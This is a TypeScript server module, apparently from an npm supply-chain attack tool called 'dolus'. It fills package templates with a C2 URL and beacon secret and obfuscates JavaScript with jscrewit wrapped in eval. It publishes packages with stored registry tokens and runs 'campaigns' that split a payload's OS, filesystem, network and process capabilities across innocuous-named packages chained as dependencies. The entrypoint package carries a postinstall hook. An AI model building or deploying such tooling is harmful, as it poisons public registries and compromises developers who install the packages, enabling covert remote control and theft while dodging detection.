import { spawnSync } from 'child_process';
import fs from 'fs';
import path from 'path';
import os from 'os';
import crypto from 'crypto';
import http from 'http';
import https from 'https';
// ponytail: CJS default import — jscrewit has no ESM export, compiled to CJS by Next.js
import jscrewit from 'jscrewit';
import db, { type Account } from './db';

// dolus/server/../packages/template
const TEMPLATE_DIR = path.join(process.cwd(), '..', 'packages', 'template');
const CAMPAIGN_DIR = path.join(process.cwd(), '..', 'packages', 'campaign');
const TEMPLATE_FILES = ['package.json', 'index.js', 'extension.js'];

export function renderTemplate(content: string, pkgName: string, c2Url: string, beaconSecret = '', version = '1.0.0'): string {
  return content
    .replaceAll('__PKG_NAME__', pkgName)
    .replaceAll('__C2_URL__', c2Url)
    .replaceAll('__BEACON_SECRET__', beaconSecret)
    .replaceAll('__VERSION__', version);
}

export function packageExistsOnRegistry(pkgName: string, registryUrl: string): Promise<boolean> {
  const base = registryUrl.endsWith('/') ? registryUrl : registryUrl + '/';
  const url = new URL(pkgName, base);
  const mod = url.protocol === 'https:' ? https : http;
  return new Promise((resolve, reject) => {
    const req = mod.request(url, { method: 'HEAD' }, res => {
      if (res.statusCode === 200) resolve(true);
      else if (res.statusCode === 404) resolve(false);
      else reject(new Error(`registry returned ${res.statusCode}`));
    });
    req.on('error', reject);
    req.end();
  });
}

/** Publish arbitrary files as an npm package. Low-level building block. */
export function publishFiles(
  pkgName: string,
  registryUrl: string,
  token: string | null,
  files: Record<string, string>,
  jsfuckEncode = true,
): { success: boolean; output: string } {
  const tmpDir = path.join(os.tmpdir(), `dolus-${crypto.randomUUID()}`);
  fs.mkdirSync(tmpDir, { recursive: true });

  try {
    for (const [file, raw] of Object.entries(files)) {
      const content = jsfuckEncode && file.endsWith('.js')
        ? `eval(${jscrewit.encode(raw, { runAs: 'none' })})`
        : raw;
      fs.writeFileSync(path.join(tmpDir, file), content);
    }

    if (token) {
      const host = new URL(registryUrl).host;
      fs.writeFileSync(path.join(tmpDir, '.npmrc'), `//${host}/:_authToken=${token}\n`);
    }

    // ponytail: spawnSync blocks event loop during publish (~2-5s), fine for PoC
    const result = spawnSync('npm', ['publish', '--registry', registryUrl], {
      cwd: tmpDir,
      encoding: 'utf8',
    });
    const output = ((result.stdout || '') + (result.stderr || '')).trim();
    return {
      success: result.status === 0 || output.includes('+ ' + pkgName + '@'),
      output,
    };
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}

/** Publish a monolithic package from the template dir. Existing behavior, now wraps publishFiles. */
export async function publishPackage(
  pkgName: string,
  registryUrl: string,
  token: string | null,
  c2Url: string,
  installJs?: string,
  beaconSecret = '',
  version = '1.0.0',
  lang: 'js' | 'ts' = 'js',
): Promise<{ success: boolean; output: string }> {
  let source = installJs;

  // Compile TS payloads via webpack
  if (lang === 'ts' && source) {
    const { compilePayload } = await import('./compiler');
    const compiled = await compilePayload(source);
    if (!compiled.success) return { success: false, output: `webpack compilation failed:\n${compiled.output}` };
    source = compiled.code!;
  }

  const files: Record<string, string> = {};
  for (const file of TEMPLATE_FILES) {
    const raw = file === 'index.js' && source != null
      ? source
      : fs.readFileSync(path.join(TEMPLATE_DIR, file), 'utf8');
    files[file] = renderTemplate(raw, pkgName, c2Url, beaconSecret, version);
  }
  // Store files for retry/viewing if the package exists in DB
  const existing = db.prepare('SELECT id FROM packages WHERE name = ?').get(pkgName) as { id: number } | undefined;
  if (existing) {
    db.prepare('UPDATE packages SET publish_files = ? WHERE id = ?').run(JSON.stringify(files), existing.id);
  }
  return publishFiles(pkgName, registryUrl, token, files);
}

export function unpublishPackage(
  pkgName: string,
  registryUrl: string,
  token: string | null,
): { success: boolean; output: string } {
  const tmpDir = path.join(os.tmpdir(), `dolus-unpub-${crypto.randomUUID()}`);
  fs.mkdirSync(tmpDir, { recursive: true });
  try {
    if (token) {
      const host = new URL(registryUrl).host;
      fs.writeFileSync(path.join(tmpDir, '.npmrc'), `//${host}/:_authToken=${token}\n`);
    }
    const result = spawnSync('npm', ['unpublish', pkgName, '--force', '--registry', registryUrl], {
      cwd: tmpDir,
      encoding: 'utf8',
    });
    return {
      success: result.status === 0,
      output: ((result.stdout || '') + (result.stderr || '')).trim(),
    };
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}

// --- Campaign capability-splitting ---

const SUFFIXES = [
  '-core', '-platform', '-io', '-client', '-runtime', '-utils',
  '-common', '-base', '-helpers', '-lib', '-module', '-service',
];

const DEFAULT_CAP_ROLES = ['cap-os', 'cap-fs', 'cap-net', 'cap-cp'];
const DEFAULT_CAP_FILES: Record<string, string> = {
  'cap-os': 'cap-os.js',
  'cap-fs': 'cap-fs.js',
  'cap-net': 'cap-net.js',
  'cap-cp': 'cap-cp.js',
};

type ChainNode = { name: string; role: string; deps: string[]; jsFile: string; depReplacements?: Record<string, string> };

export function generateCampaignChain(
  baseName: string,
  depth: number,
  capRoles?: string[],
): { entrypoint: ChainNode; nodes: ChainNode[] } {
  const roles = capRoles ?? DEFAULT_CAP_ROLES;
  const shuffled = [...SUFFIXES].sort(() => Math.random() - 0.5);
  let si = 0;
  const pick = () => {
    if (si >= shuffled.length) si = 0;
    return baseName + shuffled[si++];
  };

  const nodes: ChainNode[] = [];
  const outerShellNames: Record<string, string> = {};
  const entryDepReplacements: Record<string, string> = {};

  // Generate placeholder from role: cap-os → __CAP_OS__, cap-child_process → __CAP_CHILD_PROCESS__
  const placeholderForRole = (role: string) => `__${role.toUpperCase().replace(/-/g, '_')}__`;

  for (const role of roles) {
    const capName = pick();
    const jsFile = DEFAULT_CAP_FILES[role] ?? 'index.js';
    nodes.push({ name: capName, role, deps: [], jsFile });

    let prevName = capName;
    for (let d = 0; d < depth; d++) {
      const shellName = pick();
      nodes.push({
        name: shellName,
        role: 'shell',
        deps: [prevName],
        jsFile: 'shell.js',
        depReplacements: { '__DEP_PKG__': prevName },
      });
      prevName = shellName;
    }
    outerShellNames[role] = prevName;
    entryDepReplacements[placeholderForRole(role)] = prevName;
  }

  const entrypointName = pick();
  const entryDeps = Object.values(outerShellNames);

  return {
    entrypoint: {
      name: entrypointName,
      role: 'entrypoint',
      deps: entryDeps,
      jsFile: 'entrypoint.js',
      depReplacements: entryDepReplacements,
    },
    nodes, // ordered leaves-first (caps, then shells inner→outer)
  };
}

export async function publishCampaign(
  campaignName: string,
  accountId: number,
  depth: number,
  beaconSecret: string,
  payloadId?: number,
): Promise<{ success: boolean; packages: { name: string; role: string; status: string; output: string }[]; analysis?: import('./splitter').SplitAnalysis }> {
  const acct = db.prepare('SELECT * FROM accounts WHERE id = ?').get(accountId) as Account | undefined;
  if (!acct) return { success: false, packages: [{ name: '', role: '', status: 'failed', output: 'account not found' }] };

  // Determine split: if payloadId provided, use AST splitter; otherwise use legacy templates
  let splitResult: import('./splitter').SplitResult | null = null;
  let capRoles: string[] | undefined;
  let splitFiles: Map<string, string> | undefined; // role → JS source

  if (payloadId) {
    const payload = db.prepare('SELECT install_js, lang FROM payloads WHERE id = ?').get(payloadId) as { install_js: string; lang: string } | undefined;
    if (!payload) return { success: false, packages: [{ name: '', role: '', status: 'failed', output: 'payload not found' }] };

    let payloadSource = payload.install_js;
    if (payload.lang === 'ts') {
      const { compilePayload } = await import('./compiler');
      const compiled = await compilePayload(payloadSource);
      if (!compiled.success) return { success: false, packages: [{ name: '', role: '', status: 'failed', output: `webpack compilation failed:\n${compiled.output}` }] };
      payloadSource = compiled.code!;
    }

    const { splitPayload, capPlaceholders } = require('./splitter') as typeof import('./splitter');
    splitResult = splitPayload(payloadSource);
    capRoles = splitResult.analysis.found;
    splitFiles = new Map<string, string>();
    for (const cap of splitResult.caps) {
      splitFiles.set(cap.role, cap.code);
    }
  }

  const chain = generateCampaignChain(campaignName, depth, capRoles);
  const allNodes = [...chain.nodes, chain.entrypoint];
  const results: { name: string; role: string; status: string; output: string }[] = [];
  let allOk = true;

  db.prepare("INSERT INTO campaigns (name, account_id, depth, status, payload_id, split_analysis) VALUES (?, ?, ?, 'pending', ?, ?)").run(
    campaignName, accountId, depth, payloadId ?? null,
    splitResult ? JSON.stringify(splitResult.analysis) : null,
  );
  const campaign = db.prepare('SELECT id FROM campaigns WHERE name = ?').get(campaignName) as { id: number };

  for (const node of allNodes) {
    let jsRaw: string;

    if (splitResult && splitFiles) {
      // AST-split mode
      if (node.role === 'entrypoint') {
        jsRaw = splitResult.entrypoint;
      } else if (node.role === 'shell') {
        jsRaw = fs.readFileSync(path.join(CAMPAIGN_DIR, 'shell.js'), 'utf8');
      } else {
        jsRaw = splitFiles.get(node.role) ?? '';
      }
    } else {
      // Legacy template mode
      jsRaw = fs.readFileSync(path.join(CAMPAIGN_DIR, node.jsFile), 'utf8');
    }

    // Apply dependency name replacements (shell → dep pkg name, entrypoint → cap pkg names)
    if (node.depReplacements) {
      for (const [placeholder, replacement] of Object.entries(node.depReplacements)) {
        jsRaw = jsRaw.replaceAll(placeholder, replacement);
      }
    }

    // Apply standard placeholders
    jsRaw = renderTemplate(jsRaw, node.name, acct.c2_url, beaconSecret);

    const depsObj = node.deps.length > 0
      ? node.deps.reduce((acc, dep) => ({ ...acc, [dep]: '1.0.0' }), {} as Record<string, string>)
      : {};
    const scripts = node.role === 'entrypoint' ? { postinstall: 'node index.js' } : {};
    const pkgJson = JSON.stringify({
      name: node.name,
      version: '1.0.0',
      description: '',
      main: 'index.js',
      ...(Object.keys(depsObj).length > 0 ? { dependencies: depsObj } : {}),
      ...(Object.keys(scripts).length > 0 ? { scripts } : {}),
    }, null, 2);

    const files: Record<string, string> = {
      'package.json': pkgJson,
      'index.js': jsRaw,
    };

    db.prepare("INSERT INTO packages (name, status, account_id, campaign_id, role) VALUES (?, 'pending', ?, ?, ?)").run(
      node.name, accountId, campaign.id, node.role,
    );
    db.prepare('UPDATE packages SET publish_files = ? WHERE name = ?').run(JSON.stringify(files), node.name);

    const { success, output } = publishFiles(node.name, acct.registry_url, acct.token, files);
    const status = success ? 'published' : 'failed';
    db.prepare('UPDATE packages SET status = ? WHERE name = ?').run(status, node.name);
    results.push({ name: node.name, role: node.role, status, output });
    if (!success) allOk = false;
  }

  db.prepare('UPDATE campaigns SET status = ? WHERE id = ?').run(
    allOk ? 'published' : results.some(r => r.status === 'published') ? 'partial' : 'failed',
    campaign.id,
  );

  return { success: allOk, packages: results, analysis: splitResult?.analysis };
}

export function deleteCampaign(campaignId: number): { success: boolean; results: { name: string; ok: boolean }[] } {
  const pkgs = db.prepare('SELECT p.name, a.registry_url, a.token FROM packages p LEFT JOIN accounts a ON p.account_id = a.id WHERE p.campaign_id = ?').all(campaignId) as { name: string; registry_url: string | null; token: string | null }[];
  const results: { name: string; ok: boolean }[] = [];

  for (const pkg of pkgs) {
    if (pkg.registry_url) {
      const { success } = unpublishPackage(pkg.name, pkg.registry_url, pkg.token ?? null);
      results.push({ name: pkg.name, ok: success });
    } else {
      results.push({ name: pkg.name, ok: true });
    }
  }

  db.prepare('DELETE FROM packages WHERE campaign_id = ?').run(campaignId);
  db.prepare('DELETE FROM campaigns WHERE id = ?').run(campaignId);
  return { success: results.every(r => r.ok), results };
}

/** Retry publishing a failed package from its stored files. */
export function retryPackagePublish(packageId: number): { success: boolean; output: string } {
  const row = db.prepare(`
    SELECT p.name, p.publish_files, a.registry_url, a.token
    FROM packages p LEFT JOIN accounts a ON p.account_id = a.id
    WHERE p.id = ?
  `).get(packageId) as { name: string; publish_files: string | null; registry_url: string | null; token: string | null } | undefined;

  if (!row) return { success: false, output: 'package not found' };
  if (!row.publish_files) return { success: false, output: 'no stored files — cannot retry (package predates file storage)' };
  if (!row.registry_url) return { success: false, output: 'no account linked' };

  const files = JSON.parse(row.publish_files) as Record<string, string>;
  const { success, output } = publishFiles(row.name, row.registry_url, row.token, files);
  db.prepare('UPDATE packages SET status = ? WHERE id = ?').run(success ? 'published' : 'failed', packageId);
  return { success, output };
}

/** Fetch the files of a published package from the registry. Returns null if not reachable. */
export function fetchPackageFiles(pkgName: string, registryUrl: string, version?: string): Record<string, string> | null {
  const tmpDir = path.join(os.tmpdir(), `dolus-view-${crypto.randomUUID()}`);
  fs.mkdirSync(tmpDir, { recursive: true });
  try {
    const spec = version ? `${pkgName}@${version}` : pkgName;
    const result = spawnSync('npm', ['pack', spec, '--registry', registryUrl], {
      cwd: tmpDir,
      encoding: 'utf8',
    });
    if (result.status !== 0) return null;

    const tgz = fs.readdirSync(tmpDir).find(f => f.endsWith('.tgz'));
    if (!tgz) return null;

    spawnSync('tar', ['xzf', tgz], { cwd: tmpDir });

    const pkgDir = path.join(tmpDir, 'package');
    if (!fs.existsSync(pkgDir)) return null;

    const files: Record<string, string> = {};
    for (const file of fs.readdirSync(pkgDir)) {
      const filePath = path.join(pkgDir, file);
      if (fs.statSync(filePath).isFile()) {
        try { files[file] = fs.readFileSync(filePath, 'utf8'); } catch (_) { /* skip binary */ }
      }
    }
    return files;
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}
